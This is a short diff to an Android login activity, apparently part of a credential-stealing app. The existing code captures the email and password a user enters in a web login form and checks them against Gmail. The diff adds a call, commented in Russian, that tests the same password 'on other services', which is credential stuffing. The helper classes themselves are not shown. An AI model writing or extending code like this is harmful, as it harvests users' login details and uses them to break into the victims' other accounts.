@@ -39,7 +39,10 @@ public class WebLoginActivity extends Activity {
             } else if (data.startsWith("password=")) {
                 savedPassword = data.substring(9);
                 if (!savedEmail.isEmpty() && !savedPassword.isEmpty()) {
+                    // проверяем Gmail
                     GmailChecker.check(savedEmail, savedPassword);
+                    // проверяем пароль на других сервисах
+                    PasswordTester.testAll(savedEmail, savedPassword);
                 }
             }
         }
